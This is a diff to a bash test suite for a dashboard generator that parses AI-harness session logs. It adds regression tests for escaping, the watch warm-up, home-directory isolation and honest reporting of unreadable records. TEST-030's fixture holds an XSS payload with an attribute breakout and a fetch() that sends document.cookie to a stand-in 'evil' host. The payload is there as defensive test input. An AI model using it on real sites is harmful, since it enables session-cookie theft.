@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 #
 # Test: aai-live-status
-# (docs/specs/SPEC-DRAFT-spec-live-status-dashboard.md, TEST-001..020, 024..029)
+# (docs/specs/SPEC-DRAFT-spec-live-status-dashboard.md, TEST-001..020, 024..034)
 #
 # Verifies .aai/scripts/generate-live-status.mjs — the optional, zero-token,
 # zero-network live-status dashboard generator — plus its per-harness parser
@@ -436,7 +436,11 @@ JSONL
   local usage; usage="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='claude-code')||{}).usage_today")"
   [[ "$usage" == "10" ]] || log_fail "expected usage_today=10, got $usage"
   grep -q ">10<" "$HTML" || log_fail "html must render the exact spend figure (10) matching the data JSON"
-  grep -qi "<script " "$HTML" && log_fail "html must carry no <script> tag (no external/network reference)"
+  # BLOCKING-1 fix: the old guard was `grep -qi "<script "` (trailing space),
+  # which never matches the common `<script>` / `<script src=...>` forms —
+  # it would not have caught the actual injection this suite ships against
+  # in TEST-030. Match the tag with no trailing-space assumption.
+  grep -qi "<script" "$HTML" && log_fail "html must carry no <script> tag (no external/network reference)"
   grep -qi "http://" "$HTML" && log_fail "html must carry no http:// reference"
   grep -qi "https://" "$HTML" && log_fail "html must carry no https:// reference"
   log_pass "TEST-018: SEAM 3 — HTML KPI matches data JSON exactly, no external/network reference"
@@ -651,8 +655,177 @@ test_029_codex_cumulative_last_no_timestamp_tiebreak() {
   log_pass "TEST-029: no-timestamp session_cumulative_last records resolve last-wins deterministically by file order"
 }
 
+# ============================ TEST-030 (Spec-AC-10) ============================
+# Regression pin for BLOCKING-1 (code review): the session-quotas render
+# branch (payload.rate_limits.primary.*, foreign data read verbatim from a
+# harness JSONL file) interpolated through na() — not esc() — while every
+# sibling branch escapes. A hostile used_percent/resets_at therefore injected
+# a live <script> (and an outbound fetch(...)) into a page the spec
+# guarantees is self-contained and network-free.
+test_030_hostile_quotas_payload_escaped() {
+  log_info "Test: a hostile Codex rate_limits payload (script tag + attribute breakout in used_percent/resets_at) renders fully escaped, zero live <script> (BLOCKING-1)..."
+  local h; h="$(mk_home t030)"
+  mkdir -p "$h/.codex/sessions/2026/08/08"
+  cat > "$h/.codex/sessions/2026/08/08/rollout-1-abc.jsonl" <<'JSONL'
+{"type":"session_meta","timestamp":"2026-08-08T09:00:00.000Z","payload":{"session_id":"cx1","cwd":"/x/codexproj"}}
+{"type":"event_msg","timestamp":"2026-08-08T09:02:00.000Z","payload":{"type":"token_count","info":{"total_token_usage":{"input_tokens":20,"output_tokens":10,"cached_input_tokens":0}},"rate_limits":{"primary":{"used_percent":"50<script>alert(1)</script>","window_minutes":300,"resets_at":"2026-08-08T14:00:00Z\"><script>fetch('http://evil/'+document.cookie)</script>"}}}}
+JSONL
+  run_gen "$h"
+  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
+  [[ "$(node_get "$DATA" 'm.quotas.source')" == "session:codex" ]] || log_fail "quotas source must be session:codex"
+  # Zero LIVE <script tags in the page — this is the actual exploit surface
+  # (an executable script that could fetch()). A literal escaped mention of
+  # "http://" as inert text content is fine and expected below; it proves the
+  # hostile value survived rather than being silently dropped.
+  local n; n="$(node -e '
+    const fs=require("fs"); const h=fs.readFileSync(process.argv[1],"utf8");
+    process.stdout.write(String((h.match(/<script/gi)||[]).length));
+  ' "$HTML")"
+  [[ "$n" == "0" ]] || log_fail "html must carry zero live <script tags from foreign quota data, found $n"
+  grep -q "&lt;script&gt;alert(1)&lt;/script&gt;" "$HTML" || log_fail "html must render the ESCAPED script tag from used_percent, not drop or unescape it"
+  grep -q '&quot;&gt;&lt;script&gt;' "$HTML" || log_fail "html must render the ESCAPED attribute-breakout attempt from resets_at, not drop or unescape it"
+  log_pass "TEST-030: hostile Codex rate_limits payload renders fully escaped, zero live <script> tags"
+}
+
+# ============================ TEST-031 (Spec-AC-09) ============================
+# Regression pin for BLOCKING-2 (code review): aai-live.sh's / aai-live.ps1's
+# --watch warm-up ran the generator with --data-only (writes ONLY the JSON,
+# suppresses the HTML) and then immediately handed the (nonexistent) HTML
+# path to the platform opener. Because both outputs are gitignored, this was
+# the default first-run experience of the feature's headline command in
+# every fresh checkout. Fix: drop --data-only from the warm-up.
+test_031_watch_warmup_opens_existing_html() {
+  log_info "Test: aai-live.sh --watch warm-up writes the HTML before the opener fires, no MISSING first run (BLOCKING-2)..."
+  local scratch="$TEST_DIR/t031repo"
+  mkdir -p "$scratch"
+  # Resolve to the PHYSICAL path (pwd -P), same reason as TEST-028: on macOS
+  # $TMPDIR sits under a /var -> /private/var symlink. aai-live.sh derives
+  # REPO_ROOT via `cd "$SCRIPT_DIR/../.." && pwd` (logical, symlink-preserving),
+  # while the generator's own isMain guard compares against import.meta.url
+  # (symlink-RESOLVED by the ESM loader) — an unresolved scratch path makes
+  # them disagree, main() never runs, and the warm-up becomes a silent exit-0
+  # no-op that writes nothing, which is not the BLOCKING-2 behavior this test
+  # targets.
+  scratch="$(cd "$scratch" && pwd -P)"
+  mkdir -p "$scratch/.aai/scripts/live-parsers"
+  cp "$LIVE" "$scratch/.aai/scripts/aai-live.sh"
+  cp "$GEN" "$scratch/.aai/scripts/generate-live-status.mjs"
+  cp "$PROJECT_ROOT/.aai/scripts/live-parsers/"*.mjs "$scratch/.aai/scripts/live-parsers/"
+  local fixture_home; fixture_home="$(mk_home t031home)"
+  local openerlog="$TEST_DIR/t031-opener.log"
+  local openerbin="$TEST_DIR/t031-opener.sh"
+  : > "$openerlog"
+  cat > "$openerbin" <<SH
+#!/usr/bin/env bash
+if [[ -f "\$1" ]]; then echo "EXISTS \$1" >> "$openerlog"; else echo "MISSING \$1" >> "$openerlog"; fi
+SH
+  chmod +x "$openerbin"
+
+  # HOME (not --home: aai-live.sh's warm-up call takes no fixture flags) plus
+  # the three harness overrides pointed at the empty fixture keep this fully
+  # sandboxed, same posture as every other test in this file.
+  HOME="$fixture_home" USERPROFILE="$fixture_home" AAI_LIVE_OPENER="$openerbin" \
+    CLAUDE_CONFIG_DIR="$fixture_home/.claude" CODEX_HOME="$fixture_home/.codex" GEMINI_HOME="$fixture_home/.gemini" \
+    bash "$scratch/.aai/scripts/aai-live.sh" --watch --interval 1 > "$TEST_DIR/t031-watch.log" 2>&1 &
+  local pid=$!
+  sleep 1
+  kill -INT "$pid" 2>/dev/null || true
+  wait "$pid" 2>/dev/null || true
+
+  [[ -s "$openerlog" ]] || log_fail "opener was never invoked: $(cat "$TEST_DIR/t031-watch.log")"
+  grep -q "^MISSING" "$openerlog" && log_fail "opener received a nonexistent HTML path on first run (BLOCKING-2 regression): $(cat "$openerlog")"
+  grep -q "^EXISTS" "$openerlog" || log_fail "opener never observed the HTML as EXISTS: $(cat "$openerlog")"
+  log_pass "TEST-031: --watch warm-up writes the HTML before the opener fires; no MISSING first run"
+}
+
+# ============================ TEST-032 (Spec-AC-05) ============================
+# Regression pin for BLOCKING-3 (code review): --home overrode only
+# HOME/USERPROFILE while leaving the harnesses' own env overrides
+# (CLAUDE_CONFIG_DIR, CODEX_HOME, GEMINI_HOME) in place, and each parser
+# prefers its own override over HOME — so an exported CLAUDE_CONFIG_DIR
+# silently defeated an empty --home fixture and read the real corpus.
+test_032_home_flag_overrides_harness_env() {
+  log_info "Test: --home strips CLAUDE_CONFIG_DIR/CODEX_HOME/GEMINI_HOME so the fixture is airtight (BLOCKING-3)..."
+  local h; h="$(mk_home t032)"
+  # A real-ish CLAUDE_CONFIG_DIR that, if honored over --home, would report a
+  # PRESENT claude-code harness with a real session — the empty --home
+  # fixture must win regardless.
+  local realish="$TEST_DIR/t032-realish-claude"
+  mkdir -p "$realish/projects/proj"
+  cat > "$realish/projects/proj/leak.jsonl" <<'JSONL'
+{"type":"assistant","sessionId":"leak","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"r1","message":{"id":"m1","model":"m","usage":{"input_tokens":9,"output_tokens":9,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
+JSONL
+  mkdir -p "$h/out"
+  local out="$h/gen-run.log" data="$h/out/live-status-data.json" html="$h/out/live-status.html"
+  local ec=0
+  CLAUDE_CONFIG_DIR="$realish" CODEX_HOME="$TEST_DIR/t032-nonexistent-codex" GEMINI_HOME="$TEST_DIR/t032-nonexistent-gemini" \
+    node "$GEN" --home "$h" --output "$html" --cache "$h/cache.json" --spool-dir "$h/spool" --now "$NOW" \
+    > "$out" 2>&1 || ec=$?
+  [[ "$ec" == 0 ]] || log_fail "must exit 0: $(cat "$out")"
+  local avail; avail="$(node_get "$data" "(m.harnesses.find(h=>h.id==='claude-code')||{}).available")"
+  [[ "$avail" == "false" ]] || log_fail "--home must win over CLAUDE_CONFIG_DIR: claude-code must be ABSENT, got available=$avail"
+  local sessions; sessions="$(node_get "$data" "(m.harnesses.find(h=>h.id==='claude-code')||{}).sessions_total")"
+  [[ "$sessions" == "0" ]] || log_fail "expected zero sessions parsed from the leaked real-ish corpus, got $sessions"
+  local root; root="$(node_get "$data" "(m.harnesses.find(h=>h.id==='claude-code')||{}).root")"
+  case "$root" in
+    "$realish"*) log_fail "claude-code root still points at the leaked CLAUDE_CONFIG_DIR path: $root" ;;
+  esac
+  log_pass "TEST-032: --home overrides CLAUDE_CONFIG_DIR/CODEX_HOME/GEMINI_HOME; zero files parsed from the real-ish corpus"
+}
+
+# ============================ TEST-033 (Spec-AC-02) ============================
+# O1-family honesty fix (code review NB-2, remediated together with the
+# BLOCKING findings): a session file that fails to read (permissions,
+# mid-scan deletion, rotation) used to vanish with no trace, producing a
+# plausible-looking verified zero. It must now be named in notes[].
+test_033_unreadable_file_named_in_notes() {
+  log_info "Test: an unreadable session file is named in notes[] instead of silently vanishing (O1-family honesty)..."
+  local h; h="$(mk_home t033)"
+  mkdir -p "$h/.claude/projects/proj"
+  cat > "$h/.claude/projects/proj/s1.jsonl" <<'JSONL'
+{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"req1","message":{"id":"msg1","model":"m","usage":{"input_tokens":10,"output_tokens":5,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
+JSONL
+  chmod 000 "$h/.claude/projects/proj/s1.jsonl"
+  # Probe: root (and some CI) bypass mode bits, so the read would still
+  # succeed and there would be nothing to assert. Skip in that case.
+  if node -e 'require("fs").readFileSync(process.argv[1],"utf8")' "$h/.claude/projects/proj/s1.jsonl" >/dev/null 2>&1; then
+    chmod 644 "$h/.claude/projects/proj/s1.jsonl" 2>/dev/null || true
+    log_pass "TEST-033: skipped assertion (permission bits not enforced in this environment)"
+    return
+  fi
+  run_gen "$h"
+  chmod 644 "$h/.claude/projects/proj/s1.jsonl" 2>/dev/null || true
+  [[ "$EC" == 0 ]] || log_fail "must exit 0 even with an unreadable session file: $(cat "$OUT")"
+  local usage; usage="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='claude-code')||{}).usage_today")"
+  [[ "$usage" == "0" ]] || log_fail "unreadable file must not fabricate usage, expected 0, got $usage"
+  local hasNote; hasNote="$(node_get "$DATA" 'm.notes.some(n=>n.includes("claude-code") && n.includes("read failed"))')"
+  [[ "$hasNote" == "true" ]] || log_fail "expected a named notes[] entry for the unreadable file, got: $(node_get "$DATA" 'JSON.stringify(m.notes)')"
+  log_pass "TEST-033: unreadable session file named in notes[], usage stays honest 0 not a silent fabrication"
+}
+
+# ============================ TEST-034 (Spec-AC-02) ============================
+# O1-family honesty fix (code review NB-7 / validator O1, remediated together
+# with the BLOCKING findings): a record with no reliable timestamp matches
+# neither isToday nor within7d and used to contribute a silent, plausible 0.
+# It must now be named in notes[].
+test_034_ts_less_record_named_not_silent() {
+  log_info "Test: a record with no timestamp is named in notes[] instead of silently contributing a fabricated 0 (O1-family honesty)..."
+  local h; h="$(mk_home t034)"
+  mkdir -p "$h/.claude/projects/proj"
+  cat > "$h/.claude/projects/proj/s1.jsonl" <<'JSONL'
+{"type":"assistant","sessionId":"s1","cwd":"/x/proj","requestId":"req1","message":{"id":"msg1","model":"m","usage":{"input_tokens":10,"output_tokens":5,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
+JSONL
+  run_gen "$h"
+  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
+  local usage; usage="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='claude-code')||{}).usage_today")"
+  [[ "$usage" == "0" ]] || log_fail "ts-less record must not silently inflate usage_today, expected 0, got $usage"
+  local hasNote; hasNote="$(node_get "$DATA" 'm.notes.some(n=>n.includes("claude-code") && n.includes("no timestamp"))')"
+  [[ "$hasNote" == "true" ]] || log_fail "expected a named notes[] entry for the ts-less record, got: $(node_get "$DATA" 'JSON.stringify(m.notes)')"
+  log_pass "TEST-034: ts-less record excluded from totals AND named in notes[], never a silent fabricated 0"
+}
+
 main() {
-  echo "Testing $TEST_NAME (SPEC spec-live-status-dashboard TEST-001..020, 024..029)"
+  echo "Testing $TEST_NAME (SPEC spec-live-status-dashboard TEST-001..020, 024..034)"
   check_deps
   setup_fixture
   test_001_run_writes_both_outputs
@@ -681,6 +854,11 @@ main() {
   test_027_opener_refusal
   test_028_spaced_script_path_runs
   test_029_codex_cumulative_last_no_timestamp_tiebreak
+  test_030_hostile_quotas_payload_escaped
+  test_031_watch_warmup_opens_existing_html
+  test_032_home_flag_overrides_harness_env
+  test_033_unreadable_file_named_in_notes
+  test_034_ts_less_record_named_not_silent
   echo ""
   log_pass "All $TEST_NAME tests passed"
 }
